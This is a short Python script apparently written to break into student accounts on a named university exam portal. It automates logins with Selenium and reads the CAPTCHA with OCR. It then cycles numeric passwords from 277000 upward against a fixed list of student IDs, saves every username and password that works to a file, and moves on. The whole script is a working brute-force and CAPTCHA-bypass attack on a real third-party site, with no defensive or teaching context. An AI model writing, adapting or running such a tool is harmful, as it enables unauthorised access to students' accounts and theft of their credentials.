from selenium import webdriver
from time import sleep as sl
import easyocr
import pyautogui as pya
reader = easyocr.Reader(['en'])
driver = webdriver.Chrome(executable_path='chromedriver.exe')
driver.maximize_window()
driver.get("https://daihockinhbac.itest.com.vn/")

def saveAcc(user,pw):
	with open("acc.txt","a+") as f:
		f.write(user+"-"+pw+"\n")
def screenshot():
	im = pya.screenshot(region=(1315,420,105,30))
	im.save('captcha.png')
def readCaptcha():
	screenshot()
	results = reader.readtext('captcha.png')
	text = ""
	for i in results:
		text+=i[1]
	result = ""
	for i in text:
		try:
			int(i)
			result+=i
		except:
			pass
	return result
def check(class_name):
	list_id = [82,77,61,55,4,2,8,11,16,18,20,22,26,28,31,35,37,59,61,67,69,71,73,77,79,80,90,89]
	begin = 0
	finish = len(list_id)
	pw = 277000
	check = True
	while True:
		if list_id[begin]<10:
			user = class_name +"0"+ str(list_id[begin])
		else:
			user = class_name + str(list_id[begin])
		try:
			driver.find_element_by_id('userName').send_keys(user)
			driver.find_element_by_id('userPassword').send_keys(str(pw))
			driver.find_element_by_id('captchaInput').send_keys(str(readCaptcha()))
			driver.find_element_by_id('button_login').click()
		except:
			pass
		try:
			driver.find_element_by_id('loginfailed3')
			check = False
		except:
			pass

		try:
			driver.find_element_by_id('loginfailed1')
			pw+=1
			print(pw)
			check = False
		except:
			pass	
		if check:
			saveAcc(user,str(pw))
			pw=100000
			begin+=1
			driver.find_element_by_id('stdportal_signout').click()
			if begin>finish:
				break
		if pw > 999999:
			pw = 277000
			begin+=1
		if begin>finish:
			break
		check = True
# check("08D48000")

#404644